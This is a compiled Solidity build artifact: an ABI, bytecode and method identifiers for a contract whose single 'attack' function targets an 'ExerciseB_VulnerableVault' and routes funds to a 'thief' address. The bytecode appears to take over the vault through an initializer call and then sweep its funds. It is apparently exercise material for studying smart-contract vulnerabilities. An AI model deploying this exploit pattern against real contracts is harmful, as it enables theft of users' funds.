{"abi":[{"type":"function","name":"attack","inputs":[{"name":"target","type":"address","internalType":"contract ExerciseB_VulnerableVault"},{"name":"thief","type":"address","internalType":"address payable"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561000f575f80fd5b506102878061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c80633c48664c1461002d575b5f80fd5b610047600480360381019061004291906101c3565b610049565b005b8173ffffffffffffffffffffffffffffffffffffffff1663c4d66de8306040518263ffffffff1660e01b81526004016100829190610210565b5f604051808303815f87803b158015610099575f80fd5b505af11580156100ab573d5f803e3d5ffd5b505050508173ffffffffffffffffffffffffffffffffffffffff166301681a62826040518263ffffffff1660e01b81526004016100e89190610238565b5f604051808303815f87803b1580156100ff575f80fd5b505af1158015610111573d5f803e3d5ffd5b505050505050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101468261011d565b9050919050565b5f6101578261013c565b9050919050565b6101678161014d565b8114610171575f80fd5b50565b5f813590506101828161015e565b92915050565b5f6101928261011d565b9050919050565b6101a281610188565b81146101ac575f80fd5b50565b5f813590506101bd81610199565b92915050565b5f80604083850312156101d9576101d8610119565b5b5f6101e685828601610174565b92505060206101f7858286016101af565b9150509250929050565b61020a8161013c565b82525050565b5f6020820190506102235f830184610201565b92915050565b61023281610188565b82525050565b5f60208201905061024b5f830184610229565b9291505056fea26469706673582212201aecb35048c5ad3081b801703ab989a7a4733796c04bd1fbdae52b6aec58164264736f6c63430008180033","linkReferences":{}},"methodIdentifiers":{"attack(address,address)":"3c48664c"},"id":21}